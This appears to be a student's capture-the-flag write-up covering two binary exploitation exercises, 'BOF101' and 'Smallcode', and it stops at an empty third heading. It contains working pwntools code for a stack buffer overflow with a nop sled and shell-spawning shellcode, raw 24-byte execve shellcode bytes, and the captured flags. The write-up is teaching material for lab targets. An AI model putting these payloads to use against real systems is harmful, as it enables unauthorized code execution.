# BOF101

The first thing to do to exploit the vulnerability in this exercise as the name suggested was finding the correct offset to make the input buffer overflow.
In order to do so I used the cyclic pattern explained in the slides using pwntools methods that made this task quite simple

```python
pattern = pwn.cyclic(100)
io = pwn.process(bin)
io.sendline(pattern)
offset = pwn.cyclic_find(0x6161616C)
```

The text printed out by the bin suggested that there was a leaked address where it was possible to inject some code so I parsed it out and added it to the payload along with a 'nop sled', that assured that the next instruction would be our shellcode forged using pwntools

```python
leaked_address = io.recvuntil(b"&x=")
leaked_address = io.recvline().strip().decode()
io.sendline(
    b"a" * OFFSET_RIP
    + pwn.p64(int(leaked_address, 16))
    + pwn.asm("nop") * 50
    + pwn.asm(pwn.shellcraft.sh())
)
```

Doing so I was able to get the first flag

```
BASC{Congratz_U_3Xpl0it3d_your_f1r5t_BOF}
```

# Smallcode

```
Don't be fooled by my name: I'm a great code-runner ;-) ... though I can only run a small amount of code each time.

Send me any x64 shellcode, up to 25 bytes, and I'll execute it (at a random address, in rwx memory).
```

Using the resources I found in the slides I was able to find a shell-code on "shell-storm.org" with a length of just 24 bytes that executed the command 

```c
execve("/bin/bash",{NULL},{NULL})
```

Sending the shell-code as I found it was just enough to get the flag

```python
shellcode = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54\x5f\x31\xc0\x50\xb0\x3b\x54\x5a\x54\x5e\x0f\x05"
io.send(shellcode)
```

```
BASC{0pT1miZin9_5h3llc0d3_iS_n0T_s0_H4rD}
```

# No_syscalls

